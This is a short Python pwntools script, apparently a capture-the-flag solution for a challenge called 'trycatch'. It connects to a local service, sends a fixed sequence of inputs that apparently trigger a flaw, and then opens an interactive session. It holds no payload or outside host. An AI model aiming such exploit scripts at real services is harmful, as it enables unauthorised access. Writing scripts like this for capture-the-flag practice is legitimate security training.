#!/usr/bin/env python
from pwn import *

p = remote("localhost", 19201)#process('./chal/trycatch')

p.sendline('')
p.sendline('8 years')
p.sendline('1')
p.sendline('1')
p.sendline('0')
p.sendline('1')
p.interactive()
